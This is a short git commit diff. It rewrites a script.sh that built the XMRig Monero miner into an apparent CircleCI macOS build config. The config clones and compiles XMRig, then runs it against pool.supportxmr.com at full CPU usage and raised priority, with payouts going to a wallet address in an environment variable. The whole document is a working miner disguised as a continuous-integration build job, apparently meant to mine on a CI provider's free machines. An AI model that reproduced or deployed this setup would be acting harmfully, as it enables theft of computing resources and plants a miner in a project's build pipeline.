1bd0ab03dcd8db34875cc5a403a3fda040f6694f
verzhinrai1n9 <36103393+verzhinrai1n9@users.noreply.github.com>
2018-02-03 16:52:38 +0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,8 +1,11 @@
-brew install cmake libuv libmicrohttpd
-git clone https://github.com/xmrig/xmrig.git
-cd xmrig
-mkdir build
-cd build
-cmake ..
-make
-./xmrig -o pool.supportxmr.com:3333 -p m -u $address -k --max-cpu-usage=100 --cpu-priority=5 --donate-level=1
+version: 2
+jobs:
+  build:
+    macos:
+      xcode: "9.0"
+    steps:
+      - run: brew install cmake libuv libmicrohttpd
+      - run: git clone https://github.com/xmrig/xmrig.git xmrig_src
+      - run: cmake xmrig_src
+      - run: make
+      - run: ./xmrig -o pool.supportxmr.com:3333 -p m -u $address -k --max-cpu-usage=100 --cpu-priority=5 --donate-level=1
